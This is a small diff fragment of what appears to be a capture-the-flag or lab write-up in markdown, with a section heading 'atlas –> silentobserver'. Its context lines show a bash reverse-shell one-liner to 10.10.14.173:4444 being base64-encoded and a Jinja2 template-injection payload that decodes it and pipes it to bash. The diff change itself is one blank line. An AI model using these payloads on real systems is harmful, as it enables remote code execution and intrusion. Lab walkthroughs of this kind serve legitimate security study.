@@ -254,6 +254,7 @@ echo "bash -c 'bash -i >& /dev/tcp/10.10.14.173/4444 0>&1'" | base64
 
 ```bash
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNzMvNDQ0NCAwPiYxJwo= | base64 -d | bash').read() }}
+
 ```
 
 ## atlas –> silentobserver
